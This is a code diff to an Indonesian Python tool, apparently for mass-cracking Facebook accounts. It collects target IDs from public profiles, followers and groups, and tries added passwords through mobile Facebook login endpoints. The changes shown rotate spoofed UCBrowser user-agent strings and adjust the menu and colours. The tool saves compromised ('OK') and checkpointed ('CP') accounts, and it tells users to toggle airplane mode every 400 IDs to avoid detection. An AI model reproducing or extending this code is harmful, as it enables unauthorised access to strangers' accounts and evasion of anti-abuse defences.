@@ -92,9 +92,9 @@ for xd in range(10000):
         uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
         ugenz2.append(uaku)
 
-        aa='Mozilla/5.0 (Linux; Android'
+        aa='Mozilla/5.0 (Linux; U; Android'
         b=random.choice(['7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['Redmi Note 5 Pro Build/OPM1.171019.011; wv)'])
+        c=random.choice(['en-US; SM-G615FU Build/M1AJQ)'])
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -103,13 +103,13 @@ for xd in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
+        l='UCBrowser/13.0.5.1290 Mobile Safari/537.36'
         uabas=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
         ugenm.append(uabas)
 
-        aa='Mozilla/5.0 (Linux; Android'
-        b=random.choice(['5.0.2','6.0','7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['SM-G530BT Build/LRX22G)'])
+        aa='Mozilla/5.0 (Linux; U; Android'
+        b=random.choice(['7.0','8.1.0','9','10','11','12'])
+        c=random.choice(['en-US; Infinix X650C Build/PPR1.180610.011)'])
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -118,13 +118,13 @@ for xd in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
+        l='UCBrowser/13.1.8.1295 Mobile Safari/537.36'
         uabas=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
         ugenb.append(uabas)
         
-        aa='Mozilla/5.0 (Linux; Android'
+        aa='Mozilla/5.0 (Linux; U; Android'
         b=random.choice(['7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['vivo 1820 Build/O11019; wv)'])
+        c=random.choice(['en-US; ASUS_X01BDA Build/QKQ1)'])
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -133,7 +133,7 @@ for xd in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
+        l='UCBrowser/12.12.9.1226 Mobile Safari/537.36'
         uabas=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
         ugenf.append(uabas)
 
@@ -148,6 +148,7 @@ O = '\x1b[1;96m'
 N = '\x1b[0m'    
 Z = "\033[1;30m"
 x = '\33[m' 
+bv = '\33[0;36m'
 m = '\x1b[1;91m' 
 k = '\033[93m' 
 h = '\x1b[1;92m' 
@@ -211,7 +212,7 @@ def banner():
 \t    [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
 \t    [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
 \t    [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
-                   """,width=70,title=f"",subtitle=f"[bold white] 2.2 [/]",style=f"{warna_kolor}"))
+                   """,width=70,title=f"",subtitle=f"[bold cyan] 2.2 [/]",style=f"{warna_kolor}"))
 
 #
 def banner2():
@@ -283,9 +284,9 @@ def menu(id):
 	gpp.append(panel(f'[cyan]Status   : Free\nUserid    : {id}\nUserip    : {iplu}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	gpp.append(panel(f'[cyan]Author   : Muh Basari\nGithub   : {ghku}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	ba.print(Columns(gpp))
-	cetak(panel(f'\t                  [bold cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [bold cyan]Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' [cyan]01. Crack Publik Massal\n [cyan]02. Crack Followers\n [cyan]03. [cyan]Crack Grup Fb\n [cyan]04. Hasil Crack Akun\n [cyan]05. Lapor Bug Sc\n [cyan]00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
-	______muhammad______basari______ = input(f'Pilih :{x} ')
+	______muhammad______basari______ = input(f'{bv}Pilih : ')
 	if ______muhammad______basari______ in ['01','1']:
 		dump_massal()
 	elif ______muhammad______basari______ in ['02','2']:
@@ -323,7 +324,7 @@ def dump_grup():
 def hasil():
 	cetak(panel(f'\t                  [bold cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' [cyan]01. Akun OK\n [cyan]02. Akun CP\n [cyan]03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
-	baz_code = input(f'Pilih :{x} ')
+	baz_code = input(f'{bv}Pilih : ')
 	if baz_code in ['2']:
 		try:bass = os.listdir('CP')
 		except FileNotFoundError:
@@ -428,7 +429,7 @@ def dump_massal():
 		exit()
 	try:
 		cetak(panel(f' [cyan]Mau Berapa Id Target 1-100',width=70,title=f"",style=f"{warna_kolor}"))
-		baz_coder = int(input(f'Pilih : '))
+		baz_coder = int(input(f'{bv}Pilih : '))
 	except ValueError:
 		basari_tamvan('[!] Yang Bener Napa Cuk ')
 		time.sleep(4)
@@ -442,7 +443,7 @@ def dump_massal():
 	for met in range(baz_coder):
 		baz+=1
 		cetak(panel(f' [cyan]Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
-		bazfaa = input(f'Idz '+str(baz)+' : ')
+		bazfaa = input(f'{bv}Idz '+str(baz)+' : ')
 		uid.append(bazfaa)
 	for userr in uid:
 		try:
@@ -459,7 +460,7 @@ def dump_massal():
 			basari_tamvan('[!] Sinyal Lu Eror ')
 			exit()
 	try:
-		print(f'Total :{x} '+str(len(id)))
+		print(f'{bv}Total : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -475,7 +476,7 @@ def dump_massal():
 def setting():
 	cetak(panel(f'\t                  [bold cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' [cyan]01. Akun Lama\n [cyan]02. Akun Baru\n [cyan]03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
-	__baz__gege__ = input(f'Pilih :{x} ')
+	__baz__gege__ = input(f'{bv}Pilih : ')
 	if __baz__gege__ in ['1','01']:
 		for lama in sorted(id):
 			id2.append(lama)
@@ -501,7 +502,7 @@ def setting():
 #
 	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' [cyan]01. Mobile.Facebook\n [cyan]02. Mbasic.Facebook\n 03. [cyan]Mtouch.Facebook',width=70,title=f"",style=f"{warna_kolor}"))
-	____method_crack____ = input(f'Pilih :{x} ')
+	____method_crack____ = input(f'{bv}Pilih : ')
 	if ____method_crack____ in ['1','01']:
 		basari.append('m.facebook')
 	elif ____method_crack____ in ['']:
@@ -516,7 +517,7 @@ def setting():
 		
 #
 	cetak(panel(f' [cyan]Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
-	pwtambah=input(f'Pilih :{x} ')
+	pwtambah=input(f'{bv}Pilih : ')
 	if pwtambah in ['y','Y']:
 		pwt.append('ya')
 		cetak(panel(f' [cyan]Gunakan Koma Untuk Pemisah\n Contoh : sayang,kamu,lovyu',width=70,title=f"",style=f"{warna_kolor}"))
@@ -528,7 +529,7 @@ def setting():
 		pwt.append('no')
 		
 	cetak(panel(f' [cyan]Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
-	uat = input(f'Pilih : ')
+	uat = input(f'{bv}Pilih : ')
 	if uat in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
 		bz = input(f'└── Ugent :{M} ')
@@ -540,8 +541,10 @@ def setting():
 #
 def wordlist():
 	global prog,des
-	cetak(panel(f'      [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]\n      [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f'    [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'       [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'       [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'   [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
+	print('')
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id))
 	with prog:
